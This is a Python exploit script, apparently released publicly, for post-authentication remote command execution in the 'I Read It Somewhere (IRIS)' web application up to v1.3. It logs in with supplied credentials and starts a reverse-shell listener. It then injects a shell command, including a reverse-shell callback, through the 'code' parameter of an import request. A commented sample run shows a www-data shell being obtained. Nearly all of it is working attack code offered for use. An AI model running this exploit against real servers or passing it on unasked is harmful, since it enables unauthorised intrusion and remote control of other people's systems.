#!/usr/bin/python
# irritating-iris.py
# I Read It Somewhere (IRIS) <= v1.3 (post auth) Remote Command Execution
# download: http://ireaditsomewhere.googlecode.com
# Notes:
# - Found this in my archive, duno how long this has been 0Day for... but I had no use for it obviously.
# - Yes! ..the code is disgusting, but does the job
# - Sorry if I ripped your code, it worked for me and I dont reinvent wheels so thank you!
# ~ aeon
#
# Exploit requirements:
# ~~~~~~~~~~~~~~~~~~~~~
#
# - A valid account as at least a user
# - The target to have outgoing internet connectivity
#
# aeon@groundzero:~/dev/0day# ./irritating-iris.py -r 10.0.2.15 -d /audit/iris/ -c test:password
#
#         | ------------------------------------------------------------------------------------------------- |
#         |         I Read It Somewhere (IRIS) <= v1.3 (post auth) Remote Command Execution - by aeon         |
#         | ------------------------------------------------------------------------------------------------- |
#
# (+) Starting the shell listener
# (+) Logging into the target IRIS application
# (+) Login successful!
# (+) Receiving shell from 10.0.2.15!
#
# id;uname -a
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
# Linux bt 3.2.6 #1 SMP Fri Feb 17 10:34:20 EST 2012 x86_64 GNU/Linux
# exit
#
 
# main imports
import urllib
import urllib2
import cookielib
import sys
import threading
import time
import re
 
from base64 import b64encode, b64decode
from optparse import OptionParser
 
# webstrike framework imports
from payloads.unix import UNIXReverse
from core.listener import CbShell, ThreadedTCPServer
from core.system import SystemInfo
from exploit.utils import banner
 
parser = OptionParser()
parser.add_option("-p", dest="proxy", help="The proxy to use <ip:port>")
parser.add_option("-r", dest="rhost", help="The remote host to target [ip:port]")
parser.add_option("-d", dest="dirpath", help="The directory path to the web application [/]")
parser.add_option("-c", dest="creds", help="The credentials to use")
 
(options, args) = parser.parse_args()
 
banner("I Read It Somewhere (IRIS) <= v1.3 (post auth) Remote Command Execution - by aeon")
 
if len(sys.argv) < 5:
    parser.print_help()
    sys.exit(1)
 
print "(+) Starting the shell listener"
eth0 = SystemInfo().interfaces[1][1]
server = ThreadedTCPServer((eth0, 5555), CbShell)
server_thread = threading.Thread(target=server.serve_forever)
server_thread.daemon = True
server_thread.start()
 
print "(+) Logging into the target IRIS application"
 
login_url = "http://%s%sindex.php" % (options.rhost, options.dirpath)
username = options.creds.split(":")[0]
password = options.creds.split(":")[1]
data = "username=%s&password=%s&p=login" % (username, password)
 
cj = cookielib.CookieJar()
if options.proxy:
    proxy = urllib2.ProxyHandler({'http': options.proxy})
    opener = urllib2.build_opener(proxy, urllib2.HTTPCookieProcessor(cj))
else:
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
 
resp = opener.open(login_url, data)
 
if re.search("Hello <em>%s</em> " % username, resp.read()):
    print "(+) Login successful!"
else:
    print "(-) Login failed.."
    sys.exit(1)
 
# exploit command looks likes this:
# wget -O "/tmp/c1007066f19bbaebb979548d38b80278" "http://spnro.sagepub.com/cgi/reprint/a" -T 0.1 ||echo `uname` > /tmp/test||".pdf"
unixcmd = UNIXReverse(cb_host=eth0, cb_port="5555")
payload = unixcmd.gen_cmd().replace(" ","+")
payload = 'code=a"+-T+0.1+||%s"' % payload
exp = "http://%s%sindex.php?p=add&import=spnro&code=%s" % (options.rhost, options.dirpath, payload)
try:
    resp1 = opener.open(exp)
except:
    print "(!) exiting.."
 
server.shutdown()
sys.exit(1)
